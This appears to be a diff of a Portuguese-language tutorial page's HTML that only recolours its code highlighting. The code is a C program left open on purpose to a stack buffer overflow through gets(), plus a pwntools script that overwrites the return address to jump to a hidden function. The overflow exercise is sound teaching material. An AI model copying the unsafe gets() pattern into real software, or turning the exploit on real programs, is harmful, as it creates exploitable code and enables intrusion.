@@ -241,24 +241,24 @@
 <input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
 <label for="tab-0-0" class="tab-label">C</label>
 <div class="tab-content tab-content-0-0">
-  <div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#define _GNU_SOURCE
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;string.h&gt;</span><span style="color:#0f0;font-weight:bold">
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> secret() {
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#0ff;font-weight:bold">&#34;BOF explorado</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">secret</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;BOF explorado</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> funcvuln() {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> buffer[<span style="color:#ff0;font-weight:bold">64</span>];
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#0ff;font-weight:bold">&#34;input: &#34;</span>);
-</span></span><span style="display:flex;"><span>    gets(buffer);
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">funcvuln</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">char</span> buffer[<span style="color:#3677a9">64</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;input: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">gets</span>(buffer);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> main() {
-</span></span><span style="display:flex;"><span>    funcvuln();
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#0ff;font-weight:bold">&#34;.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">funcvuln</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div>
 </div>
@@ -311,11 +311,11 @@
 <input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
 <label for="tab-1-0" class="tab-label">Python</label>
 <div class="tab-content tab-content-1-0">
-  <div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> *
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">pwn</span> <span style="color:#6ab825;font-weight:bold">import</span> *
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>address = p64(<span style="color:#ff0;font-weight:bold">0x0000555555555159</span>)
-</span></span><span style="display:flex;"><span>payload = <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;A&#34;</span> * <span style="color:#ff0;font-weight:bold">72</span> + address
-</span></span><span style="display:flex;"><span>p = process(<span style="color:#0ff;font-weight:bold">&#34;./bof&#34;</span>)
+</span></span><span style="display:flex;"><span>address = p64(<span style="color:#3677a9">0x0000555555555159</span>)
+</span></span><span style="display:flex;"><span>payload = <span style="color:#ed9d13">b</span><span style="color:#ed9d13">&#34;A&#34;</span> * <span style="color:#3677a9">72</span> + address
+</span></span><span style="display:flex;"><span>p = process(<span style="color:#ed9d13">&#34;./bof&#34;</span>)
 </span></span><span style="display:flex;"><span>p.sendline(payload)
 </span></span><span style="display:flex;"><span>p.interactive()
 </span></span></code></pre></div>
